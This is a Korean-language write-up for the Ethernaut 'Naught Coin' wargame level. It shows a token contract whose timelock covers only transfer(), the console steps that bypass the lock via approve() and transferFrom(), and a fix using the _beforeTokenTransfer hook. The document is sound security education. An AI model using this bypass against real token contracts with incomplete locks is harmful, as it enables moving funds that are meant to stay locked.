# Ethernaut Level 15 - Naught Coin

## 문제 설명

10년 잠금 기간이 있는 ERC20 토큰을 `transfer` 제한 없이 이동시키는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract NaughtCoin is ERC20 {
    uint public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20('NaughtCoin', '0x0') {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
        super.transfer(_to, _value);
    }

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
        }
        _;
    }
}
```

---

## 취약점 분석

### ERC20의 두 가지 전송 방식

`transfer()`만 잠겨있고 **`approve()` + `transferFrom()`**은 제한이 없다.

ERC20 표준에는 두 가지 전송 방법이 있다:

| 방식 | 함수 | 잠금 여부 |
|---|---|---|
| 직접 전송 | `transfer(to, amount)` | ❌ 잠겨있음 |
| 위임 전송 | `approve()` + `transferFrom()` | ✅ 열려있음 |

---

## 공격 단계

### Step 1 — 잔액 확인

```js
(await contract.balanceOf(player)).toString()
// → "1000000000000000000000000"
```

### Step 2 — approve로 자기 자신에게 권한 부여

```js
await contract.approve(player, "1000000000000000000000000")
```

### Step 3 — transferFrom으로 전송

```js
await contract.transferFrom(
    player,
    "0x0000000000000000000000000000000000000001",  // 임의 주소
    "1000000000000000000000000"
)
```

### Step 4 — 확인

```js
(await contract.balanceOf(player)).toString()
// → "0"
```

---

## 핵심 교훈

- ERC20 표준 함수 전체를 오버라이드하지 않으면 우회 가능
- `transfer`를 막아도 `transferFrom`은 열려 있을 수 있음
- 토큰 잠금 구현 시 `_beforeTokenTransfer()` 훅 사용 권장

```solidity
// ✅ 안전한 구현
function _beforeTokenTransfer(address from, address, uint256) internal override {
    if (from == player) {
        require(block.timestamp > timeLock, "Still locked");
    }
}
```
